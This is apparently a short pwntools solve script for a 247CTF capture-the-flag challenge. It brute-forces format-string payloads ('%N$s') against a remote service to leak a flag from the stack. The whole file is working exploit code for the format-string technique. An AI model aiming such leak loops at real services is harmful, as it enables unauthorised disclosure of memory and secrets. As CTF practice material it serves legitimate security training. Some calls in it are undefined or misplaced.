from pwn import *
import sys

argv = sys.argv

DEBUG = False

context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
	gdb.attach(sh)


if DEBUG:
	context.log_level = 'debug'

def connect():
    NC = sys.argv[1]
    ip = NC.split(":")[0]
    port = int(NC.split(":")[1])
    sh = remote(ip, port)
    REMOTE = True
    return sh

# Cool!
splash()

for i in range(500):
	try:
		# Connect to local/remote process
		sh = connect()

		# Payload thats uses fsb to leak data from stack
		payload = "%" + str(i) + "$s"

		# Send payload
		sh.sendlineafter("again?\n", payload)

		# Get data
		l = sh.recvline()
		if b"247CTF" in l:
			print(l)
			break
	except:
		pass
	sh.close()

# Open shell
sh.interactive()